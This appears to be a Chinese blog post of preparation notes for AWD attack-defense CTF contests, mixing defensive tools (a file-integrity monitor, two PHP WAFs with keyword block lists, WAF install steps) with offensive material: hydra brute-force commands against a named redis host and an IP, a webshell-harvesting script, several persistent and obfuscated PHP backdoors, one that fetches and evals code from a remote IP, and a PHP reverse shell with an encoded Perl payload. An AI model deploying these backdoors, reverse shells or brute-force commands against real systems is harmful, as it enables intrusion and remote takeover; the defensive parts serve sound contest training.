---
title: awd准备工作
password: awd-prepare
abbrlink: 12920
date: 2018-08-21 10:32:18
tags: 
---

# 准备工作

## 源代码备份

* xftp

* scp

  > scp -r -P Port remote_username@remote_ip:remote_folder local_file
  >

## 主机发现

* nmap

  > nmap -sn 192.168.71.0/24
  >
  > 全端口扫描: nmap -p- -sV ip地址

* httpscan

  > https://github.com/zer0h/httpscan

## 弱口令

* hydra爆破

  * 爆破redis密码

    > hydra -P ~/Desktop/wordlist.txt redis://honglanduikburongyiya.xazlsec.com:6379  -t 2

  * 爆破ssh密码

    > hydra -l honglanduikburongyiya -P ~/Desktop/wordlist.txt -t 6 ssh://66.42.84.155

## 预留后门

* D盾
* 河马

后门利用脚本

```python
#coding=utf-8
import requests
url="http://192.168.71."
url1=""
shell="/Upload/index.php"
passwd="abcde10db05bd4f6a24c94d7edde441d18545" 
port="80"
payload = {passwd: 'system(\'cat /flag\');'}
f=open("webshelllist.txt","w") 
f1=open("firstround_flag.txt","w")
for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: 
    url1=url+str(i)+":"+port+shell
    try:
        res=requests.post(url1,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            print url1+" connect shell sucess,flag is "+res.text
            print >>f1,url1+" connect shell sucess,flag is "+res.text
            print >>f,url1+","+passwd
        else:
            print "shell 404"
    except:
        print url1+" connect shell fail"
		
f.close()
f1.close()
```

## 抓取流量

```
tcpdump –s 0 –w flow.pcap port xxxx
```

# 文件监控

```python
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {}      # 文件MD5字典
ORIGIN_FILE_LIST = []


# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log'  # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}


def isListLike(value):
    return isinstance(value, (list, tuple, set))


# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")


# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise


# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist


# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass


# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict


# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])


if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + 'n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + 'n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
```

# 有趣 backdoor

```php
<?php
session_start();
extract($_GET);
if(preg_match('/[0-9]/',$_SESSION['PHPSESSID']))
                   exit;
if(preg_match('//|./',$_SESSION['PHPSESSID']))
                   exit;
include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
?>
```

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "veneno.php";
$shell = "<?php eval($_POST[venenohi]);?>";
while (TRUE) {
    if (!file_exists($file)) {
        file_put_contents($file, $shell);
    }
    usleep(50);
}
?>
```

```php
<?php
$password = "LandGrey";
$key = substr(__FILE__,-5,-4);
${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
$f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
?>
```

```php
<?php
    unlink($_SERVER['SCRIPT_FILENAME']);     //删除脚本
    ignore_user_abort(true);
    set_time_limit(0);
    $remote_file = 'http://123.207.90.143/tmp.txt';               // 从远端获取指令
    while($code = file_get_contents($remote_file)){
    @eval($code);
    sleep(5);
};
?>          // 不好使
```

```php
<?php  
    set_time_limit(0);  
    ignore_user_abort(1);  
    unlink(__FILE__);  
    while(1){  
        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
        sleep(1);  
    }
?>       // 好使
```

# PHP_WAF

```
<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

/*
** 线下攻防php版本waf
**
** Author: 落
*/

/*
检测请求方式，除了get和post之外拦截下来并写日志。
*/
if($_SERVER['REQUEST_METHOD'] != 'POST' && $_SERVER['REQUEST_METHOD'] != 'GET'){
    write_attack_log("method");
}

$url = $_SERVER['REQUEST_URI']; //获取uri来进行检测

$data = file_get_contents('php://input'); //获取post的data，无论是否是mutipart

$headers = get_all_headers(); //获取header

filter_attack_keyword(filter_invisible(urldecode(filter_0x25($url)))); //对URL进行检测，出现问题则拦截并记录
filter_attack_keyword(filter_invisible(urldecode(filter_0x25($data)))); //对POST的内容进行检测，出现问题拦截并记录

/*
检测过了则对输入进行简单过滤
*/
foreach ($_GET as $key => $value) {
    $_GET[$key] = filter_dangerous_words($value);
}
foreach ($_POST as $key => $value) {
    $_POST[$key] = filter_dangerous_words($value);
}
foreach ($headers as $key => $value) {
    filter_attack_keyword(filter_invisible(urldecode(filter_0x25($value)))); //对http请求头进行检测，出现问题拦截并记录
    $_SERVER[$key] = filter_dangerous_words($value); //简单过滤
}

/*
获取http请求头并写入数组
*/
function get_all_headers() { 
    $headers = array(); 
 
    foreach($_SERVER as $key => $value) { 
        if(substr($key, 0, 5) === 'HTTP_') { 
            $headers[$key] = $value; 
        } 
    } 
 
    return $headers; 
} 


/*
检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改
*/
function filter_invisible($str){
    for($i=0;$i<strlen($str);$i++){
        $ascii = ord($str[$i]);
        if($ascii>126 || $ascii < 32){ //有中文这里要修改
            if(!in_array($ascii, array(9,10,13))){
                write_attack_log("interrupt");
            }else{
                $str = str_replace($ascii, " ", $str);
            }
        }
    }
    $str = str_replace(array("`","|",";",","), " ", $str);
    return $str;
}

/*
检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25
*/
function filter_0x25($str){
    if(strpos($str,"%25") !== false){
        $str = str_replace("%25", "%", $str);
        return filter_0x25($str);
    }else{
        return $str;
    }
}

/*
攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b
*/
function filter_attack_keyword($str){
    if(preg_match("/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i", $str)){
        write_attack_log("sqli");
    }

    //此处文件包含的检测我真的不会写了，求高人指点。。。
    if(substr_count($str,$_SERVER['PHP_SELF']) < 2){
        $tmp = str_replace($_SERVER['PHP_SELF'], "", $str);
        if(preg_match("/\.\.|.*\.php[35]{0,1}/i", $tmp)){ 
            write_attack_log("LFI/LFR");;
        }
    }else{
        write_attack_log("LFI/LFR");
    }
    if(preg_match("/base64_decode|eval\(|assert\(/i", $str)){
        write_attack_log("EXEC");
    }
    if(preg_match("/flag/i", $str)){
        write_attack_log("GETFLAG");
    }

}

/*
简单将易出现问题的字符替换成中文
*/
function filter_dangerous_words($str){
    $str = str_replace("'", "‘", $str);
    $str = str_replace("\"", "“", $str);
    $str = str_replace("<", "《", $str);
    $str = str_replace(">", "》", $str);
    return $str;
}

/*
获取http的请求包，意义在于获取别人的攻击payload
*/
function get_http_raw() { 
    $raw = ''; 

    $raw .= $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n"; 
     
    foreach($_SERVER as $key => $value) { 
        if(substr($key, 0, 5) === 'HTTP_') { 
            $key = substr($key, 5); 
            $key = str_replace('_', '-', $key); 
            $raw .= $key.': '.$value."\r\n"; 
        } 
    } 
    $raw .= "\r\n"; 
    $raw .= file_get_contents('php://input'); 
    return $raw; 
}

/*
这里拦截并记录攻击payload
*/
function write_attack_log($alert){
    $data = date("Y/m/d H:i:s")." -- [".$alert."]"."\r\n".get_http_raw()."\r\n\r\n";
    $ffff = fopen('log_is_a_secret_file.txt', 'a'); //日志路径 
    fwrite($ffff, $data);  
    fclose($ffff);
    if($alert == 'GETFLAG'){
        echo "HCTF{aaaa}"; //如果请求带有flag关键字，显示假的flag。（2333333）
    }else{
        sleep(15); //拦截前延时15秒
    }
    exit(0);
}

?>

```

```php

<?php
    error_reporting(0);
    define('LOG_FILENAME','log.txt');
    function waf() 
    {
        if (!function_exists('getallheaders')) { 
            function getallheaders() {
                foreach ($_SERVER as $name => $value) {
                    if (substr($name, 0, 5) == 'HTTP_')
                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
                return $headers;
            }
        }
        $get = $_GET;
        $post = $_POST; 
        $cookie = $_COOKIE; 
        $header = getallheaders(); 
        $files = $_FILES; 
        $ip = $_SERVER["REMOTE_ADDR"]; 
        $method = $_SERVER['REQUEST_METHOD']; 
        $filepath = $_SERVER["SCRIPT_NAME"];
    
    //rewirte shell which uploaded by others, you can do more
        foreach ($_FILES as $key => $value) {
            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
            file_put_contents($_FILES[$key]['tmp_name'], "virink");
        }
 
        unset($header['Accept']);//fix a bug
        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);
        //deal with
 
        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
 
        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
 
        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
 
        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
        $vpattern = explode("|",$pattern);
        $bool = false;
        foreach ($input as $k => $v) {
            foreach($vpattern as $value){
                foreach ($v as $kk => $vv) {
                    if (preg_match( "/$value/i", $vv )){
                        $bool = true;
                        logging($input);
                        break;
                   }
                }
               if($bool) break;
            }
            if($bool) break;
        }
    }
    function logging($var){
        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);
        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
    }
    waf();
```

# 安装PHP_WAF

```
import os

base_dir = '/Users/apple/Documents/data' #web路径

def scandir(startdir) :
    
    os.chdir(startdir)
    for obj in os.listdir(os.curdir) :
        path = os.getcwd() + os.sep + obj
        if os.path.isfile(path) and '.php' in obj:
            modifyip(path,'<?php','<?php\nrequire_once(\'waf.php\');') #强行加一句代码
        if os.path.isdir(obj) :
            scandir(obj)
            os.chdir(os.pardir) 

def modifyip(tfile,sstr,rstr):
    try:
        lines=open(tfile,'r').readlines()
        flen=len(lines)-1
        for i in range(flen):
            if sstr in lines[i]:
                lines[i]=lines[i].replace(sstr,rstr)
        open(tfile,'w').writelines(lines)
        
    except Exception,e:
        print e
        

scandir(base_dir)
```

## 有root权限

那麽，这样就简单了，直接写在配置中。

vim php.ini

auto_append_file = “/dir/path/phpwaf.php”

重启Apache或者php-fpm就能生效了。

当然也可以写在 .user.ini 或者 .htaccess 中。

php_value auto_prepend_file “/dir/path/phpwaf.php”

## 只有user权限

没写系统权限就只能在代码上面下手了，也就是文件包含。

这钟情况又可以用不同的方式包含。

如果是框架型应用，那麽就可以添加在入口文件，例如index.php，

如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。

```
include('phpwaf.php');
```

还有一种是替换index.php，也就是讲index.php改名为index2.php，然后讲phpwaf.php改成index.php。

当然还没完，还要在原phpwaf.php中包含原来的index.php。

```php
index.php -> index2.php

phpwaf.php -> index.php

include('index2.php')
```

#  Url跳转

```
RewriteEngine On
RewriteRule ^index\.html$ /index.php [L]

RewriteRule ^oldpage.html$ newpage.html [R=301]            网页被永久的移动
```

# PHP反弹shell

```
<?php 
function which($pr) { 
$path = execute("which $pr"); 
return ($path ? $path : $pr); 
} 
function execute($cfe) { 
$res = ''; 
if ($cfe) { 
if(function_exists('exec')) { 
@exec($cfe,$res); 
$res = join("\n",$res); 
} elseif(function_exists('shell_exec')) { 
$res = @shell_exec($cfe); 
} elseif(function_exists('system')) { 
@ob_start(); 
@system($cfe); 
$res = @ob_get_contents(); 
@ob_end_clean(); 
} elseif(function_exists('passthru')) { 
@ob_start(); 
@passthru($cfe); 
$res = @ob_get_contents(); 
@ob_end_clean(); 
} elseif(@is_resource($f = @popen($cfe,"r"))) { 
$res = ''; 
while(!@feof($f)) { 
$res .= @fread($f,1024); 
} 
@pclose($f); 
} 
} 
return $res; 
} 
function cf($fname,$text){ 
if($fp=@fopen($fname,'w')) { 
@fputs($fp,@base64_decode($text)); 
@fclose($fp); 
} 
} 
$yourip = "your IP"; 
$yourport = 'your port'; 
$usedb = array('perl'=>'perl','c'=>'c'); 
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". 
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". 
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". 
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". 
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". 
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". 
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; 
cf('/tmp/.bc',$back_connect); 
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &"); 
?> 
```

